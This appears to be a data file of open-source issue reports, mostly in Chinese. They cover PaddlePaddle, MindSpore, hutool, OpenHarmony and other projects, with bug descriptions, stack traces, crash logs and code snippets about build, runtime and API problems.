accuracy performance comparison using with_fast_math ,"在GPU上的开关是, 在CPU上的开关是。以下三个测试，因为batch_norm_op中含有sqrt函数，开关ON/OFF对sqrt的精度有影响。 image_classification （GPU） http://180.76.57.222/commit/draw_scalar?task=model_image_classification 指标 with_fast_math=ON with_fast_math=OFF 效果 train_acc_top1 0.3778 0.4095 提升3.17点 train_acc_top5 0.7432 0.7727 提升2.95点 test_acc_top5 0.5245 0.551 提升2.55点 test_acc_top1 0.248 0.2441 降低0.39点 train_acc_top1_card4 0.3473 0.3334 降低1.39点 train_acc_top5_card4 0.6914 0.6648 降低2.66点 test_acc_top1_card4 0.2294 0.1971 降低3.19点 test_acc_top5_card4 0.3473 0.3334 降低1.39点 从表中的数据看，单卡上面，训练的top1/top5精度都提升了3个点，测试集的top5精度也提升了2.5点，top1精度略有下降。但多卡上面，全部精度都下降了。此外，训练速度方面无波动。 resnet50_GPU http://ce.paddlepaddle.org/commit/draw_scalar?task=resnet50_net_GPU 指标 with_fast_math=ON with_fast_math=OFF 效果 flowers_64_GPU_1_Cards_train_acc 0.3254 0.3189 降低0.65点 cifar10_128_GPU_1_Cards_train_acc 0.519 0.528 提升0.9点 flowers_64_Reduce_GPU_4_Cards_train_acc 0.2766 0.2875 提升1.09点 flowers_64_ALLReduce_GPU_4_Cards_train_acc 0.2869 0.2797 降低0.72点 cifar10_128_Reduce_GPU_4_Cards_train_acc 0.5331 0.5204 降低1.27点 cifar10_128_AllReduce_GPU_4_Cards_train_acc 0.525 0.5097 降低1.53点 从表中数据看，cifar10数据集的单卡提升了0.9点，多卡降低了1点多；flowers数据集的单卡降低0.65点，多卡上有升有降。 resnet50_CPU http://ce.paddlepaddle.org/commit/draw_scalar?task=resnet50_net_CPU 指标 with_fast_math=ON with_fast_math=OFF 效果 flowers_8_CPU_1_Cards_train_acc 0.0938 0.0625 降低3.13点 flowers_8_Reduce_CPU_4_Cards_train_acc 0.0125 0.0312 提升1.87点 flowers_8_AllReduce_CPU_4_Cards_train_acc 0.0125 0.0312 提升1.87点 cifar10_8_CPU_1_Cards_train_acc 0.425 0.525 提升10个点 cifar10_8_Reduce_CPU_4_Cards_train_acc 0.4625 0.375 降低8.75点 cifar10_8_AllReduce_CPU_4_Cards_train_acc 0.4625 0.375 降低8.75点 从表中数据看，cifar10数据集的单线程提升了10个点，多线程降低了8点多；flowers数据集的单线程降低3点，多线程提升1.87点。单线程/多线程的反应正好相反。   <code>: With_fast_math use_fast_math EIGEN_FAST_MATH"
【众智】【计算-AICPU接入】Sub,"Sub 基础复数算子，逐元素相减 x1 x2 y 对应底层算子 对应底层AICPU算子Sub @ops.RegisterGradient(""Sub"") 先接入和验收正向，反向阻塞   <code>: class Sub(_MathBinaryOp):"
ZIpUtil,"JDK版本： jdk8 hutool版本： 5.7.7 没有报错信息 压缩任何文件都是如此   <code>: @RequestMapping(""/exportzip"") public void exportZip(HttpServletResponse response) throws IOException { try { response.setContentType(""application/zip""); response.setCharacterEncoding(""UTF-8""); String fileName = URLEncoder.encode(""测试zip"", ""UTF-8"").replace(""\\+"", ""%20""); response.setHeader(""Content-disposition"", ""attachment;filename*=utf-8''"" + fileName + "".zip""); OutputStream outputStream = response.getOutputStream(); File file = new File(""C:\\Users\\insp\\Desktop\\代码评审流程规范v4.0.docx""); file.getName(); String path1 = ""test/1.docx""; String path12 = ""test2/2.docx""; ZipOutputStream zipOutputStream = new ZipOutputStream(outputStream); ZipUtil.zip(zipOutputStream, new String[]{path1}, new FileInputStream[]{new FileInputStream(new File(""C:\\Users\\insp\\Desktop\\代码评审流程规范v4.0.docx""))}); ZipUtil.zip(zipOutputStream, new String[]{path12}, new FileInputStream[]{new FileInputStream(new File(""C:\\Users\\insp\\Desktop\\代码评审流程规范v4.0.docx""))}); } catch (Exception e) { e.printStackTrace(); } public static void zip(ZipOutputStream zipOutputStream, String[] paths, InputStream[] ins) 调用的ziputi的这个方法 没有任何报错 但是下载的压缩文件显示压缩文件损坏 public static void zip(OutputStream OutputStream, String[] paths, InputStream[] ins) 这个方法可以正常使用 但是由于源码中默认关闭了outputStream 导致我无法多次压缩到输出流中"
HttpUtil.createGet()URL带～/:符号被转码问题,JDK版本： 1.8 hutool版本： 5.3.10   <code>: 原：https://qiniu.nocov.cn/medical-manage%2Ftest%2FBANNER_IMG%2F444004467954556928%2F1595215173047icon.png~imgReduce?e=1597081986&amp;token=V2lJYVgQgAv_sbypfEZ0qpKs6TzD1q5JIDVr0Tw8:89cbBkLLwEc9JsMoCLkAEOu820E= 转：https://qiniu.nocov.cn/medical-manage%2Ftest%2FBANNER_IMG%2F444004467954556928%2F1595215173047icon.png%7EimgReduce?e=1597081986&amp;token=V2lJYVgQgAv_sbypfEZ0qpKs6TzD1q5JIDVr0Tw8%3A89cbBkLLwEc9JsMoCLkAEOu820E%3D
protobuf link error when run test on Macos,"build with the lastest develop branch run test will report me protobuf link error. I can't run any test case. Error message e.g. paddle use the thrid_party protobuf.   <code>: Constructing a list of tests Done constructing a list of tests Updating test list for fixtures Added 0 tests to meet fixture requirements Checking test dependency graph... Checking test dependency graph end test 29 Start 29: test_ActivationGrad 29: Test command: /Users/dzh/github/PaddleDevelop/Paddle/build/paddle/gserver/tests/test_ActivationGrad 29: Test timeout computed to be: 9.99988e+06 29: dyld: Symbol not found: __ZNK6google8protobuf7Message13SpaceUsedLongEv 29: Referenced from: /Users/dzh/github/PaddleDevelop/Paddle/build/paddle/gserver/tests/test_ActivationGrad 29: Expected in: flat namespace 29: in /Users/dzh/github/PaddleDevelop/Paddle/build/paddle/gserver/tests/test_ActivationGrad 1/1 Test #29: test_ActivationGrad ..............***Exception: Other 0.01 sec 0% tests passed, 1 tests failed out of 1 Total Test time (real) = 0.02 sec The following tests FAILED: 29 - test_ActivationGrad (OTHER_FAULT) Errors while running CTest -- Found Paddle host system: macosx -- Found Paddle host system's CPU: 4 cores -- Protobuf protoc executable: /usr/local/bin/protoc -- Protobuf library: /Users/dzh/github/PaddleDevelop/Paddle/third_party/install/protobuf/lib/libprotobuf.a -- Protobuf version: 3.3 -- BLAS library: /Users/dzh/github/PaddleDevelop/Paddle/third_party/install/openblas/lib/libopenblas.a -- Ccache is founded, use ccache to speed up compile. -- Paddle version is 0.10.0 -- Configuring done -- Generating done -- Build files have been written to: /Users/dzh/github/PaddleDevelop/Paddle/build"
Caused by: java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter,由于缺少jaxb-api包导致的。在Java 8以及以前的版本，是默认包含jaxb这个jar包的；但是在java SE 9.0就不再包含着个包了，如果使用则需要手动引进。 解决： 降低JDK版本到1.8 手动导入以下包： 参考链接：https://blog.csdn.net/qq_44895397/article/details/108626052   <code>: &lt;dependency&gt; &lt;groupId&gt;javax.xml.bind&lt;/groupId&gt; &lt;artifactId&gt;jaxb-api&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.xml.bind&lt;/groupId&gt; &lt;artifactId&gt;jaxb-impl&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.xml.bind&lt;/groupId&gt; &lt;artifactId&gt;jaxb-core&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.activation&lt;/groupId&gt; &lt;artifactId&gt;activation&lt;/artifactId&gt; &lt;version&gt;1.1.1&lt;/version&gt; &lt;/dependency&gt;
监控服务设置了WebHooks，无法推送并报错 ,"java version ""1.8.0_192"" Java(TM) SE Runtime Environment (build 1.8.0_192-b12) Java HotSpot(TM) 64-Bit Server VM (build 25.192-b12, mixed mode) Jpom版本客服端和服务端都是 2.9.14 Ubuntu 16.04 64位 1 设置监控 at java.util.stream.Abstrac   <code>: nodeId projectId createTime title content status notifyStyle monitorId notifyObject workspaceId createTimeMillis id nodeId projectId createTime title content status notifyStyle monitorId notifyObject workspaceId createTimeMillis id"
[ST][MS][NET][fcn8s][SP][910 8p]RuntimeRrror: Conv2Dinfo6060: The send or recv len larger than slice shape of w dimension 2,"wide&amp;deep网络SP特性在910环境8p训练失败 / 硬件环境: /device ascend/GPU : -- MindSpore version :r1.9 commit_id:3666d044c -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221010 MindSpore 版本：编译时间20221013160056 r1.9 commit_id:3666d044c (/): /mode graph test_ms_wide_deep_criteo_train_sp_check_910_8p_0001.py cd solution_test/cases/02network/06recommend/wide_deep/train pytest -s test_ms_wide_deep_criteo_train_sp_check_910_8p_0001.py wide&amp;deep网络ps特性在910/gpu环境训练成功 走给毕朝阳   <code>: [CRITICAL] PARALLEL(65504,ffffb13a9010,python):2022-10-14-11:24:52.246.093 [mindspore/ccsrc/frontend/parallel/ops_info/conv2d_info.cc:794] InferCommunicationAttrs] Conv2DInfo6060: The send or recv len larger than slice shape of w dimension 2 [WARNING] MD(65504,ffffb13a9010,python):2022-10-14-11:24:52.359.295 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 0; batch_queue: 0; push_start_time: ; push_end_time: . [TRACE] HCCL(65504,python):2022-10-14-11:24:53.206.046 [status:stop] [hcom.cc:264][hccl-65504-0-1665717857-hccl_world_group][0]hcom destroy complete,take time [760340]us, rankNum[8], rank[0] Traceback (most recent call last): File ""train.py"", line 178, in &lt;module&gt; train() File ""/ms_test1/zjc/workspace/solution_test/cases/02network/06recommend/wide_deep/train/FCN8s/train_parallel0/src/model_utils/moxing_adapter.py"", line 113, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 174, in train model.train(config.train_epochs, dataset, callbacks=cbs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1050, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 596, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 985, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 957, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1131, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: Conv2DInfo6060: The send or recv len larger than slice shape of w dimension 2 ---------------------------------------------------- - The Traceback of Net Construct Code: ---------------------------------------------------- # In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/pooling.py:150 out = self.max_pool(x) ^ ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/frontend/parallel/ops_info/conv2d_info.cc:794 InferCommunicationAttrs"
买了文档，想问问pig-docker.zip在哪里可以下？,pig版本:1.3.2 操作系统:windows 是否修改包名: no 买了文档，想问问pig-docker.zip在哪里可以下？   <code>: 买了文档，想问问pig-docker.zip在哪里可以下？
【公告】Issue 格式！！！,Title Issue 的标题请遵循 的格式，如： 添加举报机制 标签与优先级 标签：各位提交 Issue 前请打好标签，Feature（新特性）还是 Bug 优先级：暂不需要，各位提交后我来设置 Feature 模板 Bug 模板   <code>: 表情 + 空格 + 具体内容 ### 功能描述 &gt; 此处写对这个新特性的具体描述 ### 初步考虑 &gt; 此处写你对这个 Feature 的初步设计思路，若暂时没有思路则写 “暂无” ### 问题描述 &gt; 此处写对这个 Bug 的具体描述 ### 图片说明 &gt; 此处贴上这个 Bug 的图片
"convert paddle to c++ occurs error ” Tensor holds the wrong type, it holds float, but desires to be int64_t“","os environment： ubuntu18.04 with gpu 10.0，cudnn 7 paddle2.0 operation： when convert paddle ocr_attention to ++,whcih occurs error as following: error: C++ Call Stacks (More useful to developers): 0 std::string paddle::platform::GetTraceBackString&lt;std::string const&amp;&gt;(std::string const&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 2 long const* paddle::framework::Tensor::data() const 3 paddle::operators::LookupTableV2CUDAKernel::Compute(paddle::framework::ExecutionContext const&amp;) const 4 std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CUDAPlace, false, 0ul, paddle::operators::LookupTableV2CUDAKernel, paddle::operators::LookupTableV2CUDAKernel, paddle::operators::LookupTableV2CUDAKernelpaddle::platform::float16 &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1:测试Issue}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) 5 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;, paddle::framework::RuntimeContext*) const 6 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 7 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 8 paddle::framework::Executor::RunPartialPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, long, long, bool, bool, bool) 9 paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) 10 paddle::operators::WhileOp::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 11 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 12 paddle::framework::NaiveExecutor::Run() 13 paddle::AnalysisPredictor::ZeroCopyRun() Python Call Stacks (More useful to users): File ""infer.py"", line 182, in main() File ""infer.py"", line 176, in main inference(args) File ""infer.py"", line 60, in inference ids = infer(images, num_classes, use_cudnn=True if args.use_gpu else False) File ""/home/george/my_ocr_recognition/models/PaddleCV/ocr_recognition/attention_model.py"", line 291, in attention_infer pre_ids_emb = fluid.embedding( File """", line 2, in embedding File ""/root/anaconda3/lib/python3.8/site-packages/paddle/fluid/wrapped_decorator.py"", line 25, in impl return wrapped_func(*args, **kwargs) File ""/root/anaconda3/lib/python3.8/site-packages/paddle/fluid/framework.py"", line 232, in impl return func(*args, **kwargs) File ""/root/anaconda3/lib/python3.8/site-packages/paddle/fluid/input.py"", line 322, in embedding helper.append_op( File ""/root/anaconda3/lib/python3.8/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/root/anaconda3/lib/python3.8/site-packages/paddle/fluid/framework.py"", line 2840, in append_op op = Operator( File ""/root/anaconda3/lib/python3.8/site-packages/paddle/fluid/framework.py"", line 1931, in init for frame in traceback.extract_stack(): Error Message Summary: InvalidArgumentError: Tensor holds the wrong type, it holds float, but desires to be int64_t. [Hint: Expected valid == true, but received valid:0 != true:1.] at (/home/george/paddle/paddle/fluid/framework/tensor_impl.h:33) [operator &lt; lookup_table_v2 &gt; error] Aborted (core dumped) 我该怎么修改，我改写了attention_model.py中的def attention_infer（）里的pre_ids_emb = fluid.embedding相关参数，怎么搞都没有成功，def attention_infer函数如下： def attention_infer(images, num_classes, use_cudnn=True): infer.py的程序如下： def inference(args): """"""OCR inference"""""" if args.model == ""crnn_ctc"": infer = ctc_infer get_feeder_data = get_ctc_feeder_for_infer else: infer = attention_infer get_feeder_data = get_attention_feeder_for_infer eos = 1 sos = 0 num_classes = data_reader.num_classes() data_shape = data_reader.data_shape() # define network if len(list(data_shape)) == 3: data_shape = [None] + list(data_shape) images = fluid.data(name='pixel', shape=data_shape, dtype='float32') ids = infer(images, num_classes, use_cudnn=True if args.use_gpu else False) # data reader infer_reader = data_reader.inference( batch_size=args.batch_size, infer_images_dir=args.input_images_dir, infer_list_file=args.input_images_list, cycle=True if args.iterations &gt; 0 else False, model=args.model) # prepare environment place = fluid.CPUPlace() if args.use_gpu: place = fluid.CUDAPlace(0) 谁可以告诉我，谢谢！   <code>: max_length = 20 gru_backward, encoded_vector, encoded_proj = encoder_net( images, is_test=True, use_cudnn=use_cudnn) backward_first = fluid.layers.sequence_pool( input=gru_backward, pool_type='first') decoder_boot = fluid.layers.fc(input=backward_first, size=decoder_size, bias_attr=False, act=""relu"") init_state = decoder_boot array_len = fluid.layers.fill_constant( shape=[1], dtype='int64', value=max_length) counter = fluid.layers.zeros(shape=[1], dtype='int64', force_cpu=True) # fill the first element with init_state state_array = fluid.layers.create_array('float32') fluid.layers.array_write(init_state, array=state_array, i=counter) # ids, scores as memory ids_array = fluid.layers.create_array('int64') scores_array = fluid.layers.create_array('float32') init_ids = fluid.data( name=""init_ids"", shape=[None, 1], dtype=""int64"", lod_level=2) init_scores = fluid.data( name=""init_scores"", shape=[None, 1], dtype=""float32"", lod_level=2) fluid.layers.array_write(init_ids, array=ids_array, i=counter) fluid.layers.array_write(init_scores, array=scores_array, i=counter) cond = fluid.layers.less_than(x=counter, y=array_len) while_op = fluid.layers.While(cond=cond) with while_op.block(): pre_ids = fluid.layers.array_read(array=ids_array, i=counter) pre_state = fluid.layers.array_read(array=state_array, i=counter) pre_score = fluid.layers.array_read(array=scores_array, i=counter) #pre_ids = paddle.reshape(pre_ids, shape=[-1,1]) print('----------------') print(pre_ids) #pre_ids = fluid.layers.cast(x=pre_ids, dtype='float32') print('----------------') pre_ids_emb = fluid.embedding( input=pre_ids, size=[num_classes + 2, word_vector_dim], dtype='float32') context = simple_attention(encoded_vector, encoded_proj, pre_state, decoder_size) # expand the recursive_sequence_lengths of pre_state to be the same with pre_score pre_state_expanded = fluid.layers.sequence_expand(pre_state, pre_score) context_expanded = fluid.layers.sequence_expand(context, pre_score) fc_1 = fluid.layers.fc(input=context_expanded, size=decoder_size * 3, bias_attr=False) fc_2 = fluid.layers.fc(input=pre_ids_emb, size=decoder_size * 3, bias_attr=False) decoder_inputs = fc_1 + fc_2 current_state, _, _ = fluid.layers.gru_unit( input=decoder_inputs, hidden=pre_state_expanded, size=decoder_size * 3) current_state_with_lod = fluid.layers.lod_reset( x=current_state, y=pre_score) # use score to do beam search current_score = fluid.layers.fc(input=current_state_with_lod, size=num_classes + 2, bias_attr=True, act='softmax') topk_scores, topk_indices = fluid.layers.topk( current_score, k=beam_size) # calculate accumulated scores after topk to reduce computation cost accu_scores = fluid.layers.elementwise_add( x=fluid.layers.log(topk_scores), y=fluid.layers.reshape( pre_score, shape=[-1]), axis=0) selected_ids, selected_scores = fluid.layers.beam_search( pre_ids, pre_score, topk_indices, accu_scores, beam_size, eos, # end_id #level=0 ) fluid.layers.increment(x=counter, value=1, in_place=True) # update the memories fluid.layers.array_write(current_state, array=state_array, i=counter) fluid.layers.array_write(selected_ids, array=ids_array, i=counter) fluid.layers.array_write(selected_scores, array=scores_array, i=counter) # update the break condition: up to the max length or all candidates of # source sentences have ended. length_cond = fluid.layers.less_than(x=counter, y=array_len) finish_cond = fluid.layers.logical_not( fluid.layers.is_empty(x=selected_ids)) fluid.layers.logical_and(x=length_cond, y=finish_cond, out=cond) ids, scores = fluid.layers.beam_search_decode(ids_array, scores_array, beam_size, eos) return ids exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) # load dictionary dict_map = None if args.dict is not None and os.path.isfile(args.dict): dict_map = {} with open(args.dict) as dict_file: for i, word in enumerate(dict_file): dict_map[i] = word.strip() print(""Loaded dict from %s"" % args.dict) # load init model model_dir = args.model_path fluid.load( program=fluid.default_main_program(), model_path=model_dir, executor=exe, var_list=fluid.io.get_program_parameter(fluid.default_main_program())) print(""Init model from: %s."" % args.model_path) fluid.io.save_inference_model( dirname=""./mobilenet/"", feeded_var_names=['pixel'], target_vars=[ids], executor=exe, model_filename='model', params_filename='params') batch_times = [] iters = 0 for data in infer_reader(): feed_dict = get_feeder_data(data, place) if args.iterations &gt; 0 and iters == args.iterations + args.skip_batch_num: break if iters &lt; args.skip_batch_num: print(""Warm-up itaration"") if iters == args.skip_batch_num: profiler.reset_profiler() start = time.time() result = exe.run(fluid.default_main_program(), feed=feed_dict, fetch_list=[ids], return_numpy=False) indexes = prune(np.array(result[0]).flatten(), 0, 1) batch_time = time.time() - start fps = args.batch_size / batch_time batch_times.append(batch_time) if dict_map is not None: print(""Iteration %d, latency: %.5f s, fps: %f, result: %s"" % ( iters, batch_time, fps, [dict_map[index] for index in indexes], )) else: print(""Iteration %d, latency: %.5f s, fps: %f, result: %s"" % ( iters, batch_time, fps, indexes, )) iters += 1 latencies = batch_times[args.skip_batch_num:] latency_avg = np.average(latencies) latency_pc99 = np.percentile(latencies, 99) fpses = np.divide(args.batch_size, latencies) fps_avg = np.average(fpses) fps_pc99 = np.percentile(fpses, 1) # Benchmark output print('\nTotal examples (incl. warm-up): %d' % (iters * args.batch_size)) print('average latency: %.5f s, 99pc latency: %.5f s' % (latency_avg, latency_pc99)) print('average fps: %.5f, fps for 99pc latency: %.5f' % (fps_avg, fps_pc99))"
【OpenHarmony】【LTS3.0】在L1 3516liteOS/3518上xts循环压测出现内存崩溃问题，导致单板卡死，出现大量UN项。,"简要描述： 【LTS3.0】在L1 3516liteOS/3518S上xts循环压测出现内存崩溃问题，导致单板卡死，出现大量UN项。 【环境信息】: 硬件开发板型号：L1 3516liteOS/3518 软件版本信息或tag节点:openharmony3.0LTS分支版本 测试环境 其他 【预置条件】: 向L1单板中刷入openharmony3.0LTS分支版本，配网并mount本地pc 【测试步骤】： 执行acts，进行循环压测 【预期结果】： 测试套执行通过 【实际结果】： 测试套执行失败，单板卡死 【恢复手段】： 【出现概率】：10/10 【定位信息】： Log、截图、多媒体文件等，所有和问题有关的信息： [ERR]OsVmRegionRightCheck 67 vaddr 0x27947000, l1Index 633, ttEntry 0x4154c421, l2Table 0x4154c400, l2Index 71, pfn 0x40f1aa7f count 2 PID aspace name base size pages 63 0x415005cc UserProces 0x01000000 0x3e000000 214 ##################excFrom: User!#################### data_abort fsr:0x80f, far:0x27947000 Abort caused by a write instruction. Permission fault, page excType: data abort processName = UserProcess63 processID = 63 process aspace = 0x01000000 -&gt; 0x3f000000 taskName = thread0 taskID = 66 task user stack = 0x3ac6f000 -&gt; 0x3ad6f000 pc = 0x9e8d0d0 in /test_root/kernel/ActsIpcShmTest.bin ---&gt; 0x100d0 ulr = 0x0 usp = 0x3ad6e930 fp = 0x3ad6e988 R0 = 0x31 R1 = 0x9e85a76 R2 = 0x0 R3 = 0x6d R4 = 0x27947000 R5 = 0x0 R6 = 0x0 R7 = 0x1 R8 = 0x2785702c R9 = 0x2785702c R10 = 0x1 R11 = 0x3ad6e988 R12 = 0x0 CPSR = 0x60070010 <em>backtrace begin</em> traceback fp fixed, trace using fp = 0x3ad6e9b8 traceback 0 -- lr = 0x9ea0270 fp = 0x3ad6eb40 lr in /test_root/kernel/ActsIpcShmTest.bin --&gt; 0x23270 traceback 1 -- lr = 0x9e90f40 fp = 0x3ad6ed08 lr in /test_root/kernel/ActsIpcShmTest.bin --&gt; 0x13f40 traceback 2 -- lr = 0x277f3f30 fp = 0x0 lr in /lib/libc.so --&gt; 0x56f30   <code>: region name base size mmu_flags pages pg/ref ------ ---- ---- ---- --------- ----- ----- 0x4150d914 /test_root/kernel/ActsIpcShmTest 0x09e7d000 0x0000a000 CH US RD 9 4 0x406b5af8 /test_root/kernel/ActsIpcShmTest 0x09e87000 0x0001e000 CH US RD EX 28 14 0x406d43b4 /test_root/kernel/ActsIpcShmTest 0x09ea5000 0x00001000 CH US RD 1 1 0x4180d824 /test_root/kernel/ActsIpcShmTest 0x09ea6000 0x00001000 CH US RD WR 1 1 0x4150ca24 /lib/libc.so 0x2779d000 0x0004a000 CH US RD 25 12 0x40cc39a8 /lib/libc.so 0x277e7000 0x00068000 CH US RD EX 49 5 0x41812cec /lib/libc.so 0x2784f000 0x00002000 CH US RD WR 2 1 0x413554b4 /lib/libc.so 0x27851000 0x00002000 CH US RD WR 2 1 0x4180c748 MMAP 0x27853000 0x00005000 CH US RD WR 5 4 0x41826ee0 VDSO 0x27858000 0x00002000 CH US RD EX 2 2 0x418289fc /lib/libc++.so 0x2785a000 0x00046000 CH US RD 50 25 0x41813058 /lib/libc++.so 0x278a0000 0x0009f000 CH US RD EX 30 6 0x4150d574 /lib/libc++.so 0x2793f000 0x00006000 CH US RD 6 3 0x40cd3db4 /lib/libc++.so 0x27945000 0x00001000 CH US RD WR 1 1 0x40cd59f4 MMAP 0x27946000 0x00001000 CH US RD WR 1 1 0x406ff72c SHM 0x27947000 0x00001000 CH US RD 1 1 0x40a8c5e8 STACK 0x3ac6f000 0x00100000 CH US RD WR 1 1"
使用UINavMenu加载UIPage的子窗体，会触发UIPage的窗体的load和shown事件。,"我使用UINavMenu加载很多UIPage的子窗体，但是发现执行CreateChildNode的时候，会触发UIPage的窗体的load和shown事件。 这个是窗体代码 这个是调用过程 当执行到Aside.CreateChildNode的时候，就会触发Form1窗体的Form1_Load和Form1_Shown。因为当我的窗体比较多，很多窗体都要对数据做初始化的时候，估计加载就会变得十分缓慢。   <code>: public partial class Form1 : UIPage { public Form1() { InitializeComponent(); this.Load += Form1_Load; this.Shown += Form1_Shown; } private void Form1_Shown(object sender, EventArgs e) { throw new NotImplementedException(); } private void Form1_Load(object sender, EventArgs e) { throw new NotImplementedException(); } } int pageIndex = 1; TreeNode parent = Aside.CreateNode(""TopClass"", 61451, 24, pageIndex); Form1 frm = new Form1(); Aside.CreateChildNode(parent, 61640, 24, AddPage(frm, ++pageIndex));"
level=2?的lod-tensor，在DynamicRNN中对它调用step_input()函数，在CPU上没问题，但是在GPU上报segment?fault,一个level=2 的lod-tensor ，在DynamicRNN的block中对它调用step_input()函数，在CPU上运行没问题，但是在GPU上报segment fault。代码如下： 报错信息如下： 3）Operator信息   <code>: drnn = fluid.layers.DynamicRNN() with drnn.block(): x_ = drnn.step_input(x) # 这里 x 是level=2的lod-tensor
trainer_count does not take effect in v2 api,"I am implementing a model recently. I found that the command line parameter does not take effect in v2 api. It seems that PaddlePaddle simply ignores this command line parameter and occupies all the CPU cores. The code is as follows: See https://github.com/PaddlePaddle/models/blob/develop/neural_seq_qa/train.py#L78 for more details.   <code>: trainer_count paddle.init(use_gpu=false, trainer_count=4)"
目录下没有bin/package.bat ,看文档，后端打包的时候，要 在项目的目录下执行 bin/package.bat， 项目目录下没有bin目录啊，求救。 直接通过打包出来，运行报错：   <code>: nvm install org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'weCallBackController': Unsatisfied dependency expressed through field 'weEventHandle'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'weEventHandle': Unsatisfied dependency expressed through field 'weCallBackEventFactoryMap'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'weEventChangeContactImpl': Unsatisfied dependency expressed through field 'weStrategyBeanFactory'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'weStrategyBeanFactory' defined in URL [jar:file:/www/server/tomcat_site/linkwechat.dianshizone.com/linkwe-admin.jar!/BOOT-INF/lib/linkwe-wecom-3.1.0.jar!/com/linkwechat/wecom/factory/WeStrategyBeanFactory.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'msg_audit_approved': Unsatisfied dependency expressed through field 'weChatContactMappingService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'weChatContactMappingServiceImpl': Unsatisfied dependency expressed through field 'weConversationArchiveService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'weConversationArchiveServiceImpl': Unsatisfied dependency expressed through field 'elasticSearch'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'elasticSearch': Unsatisfied dependency expressed through field 'restHighLevelClient'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'restHighLevelClient' defined in class path resource [com/linkwechat/common/config/ElasticSearchConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.elasticsearch.client.RestHighLevelClient]: Factory method 'restHighLevelClient' threw exception; nested exception is java.lang.ArrayIndexOutOfBoundsException: 1
[使用问题]ForestConfiguration在哪配置最好?,"Springboot项目,我都是在使用的地方(service)中: 刚学,感觉low 不知道在哪配置最好   <code>: @Autowired private ForestConfiguration forestConfiguration; ... forestConfiguration.setJsonConverter(new ForestJacksonConverter());"
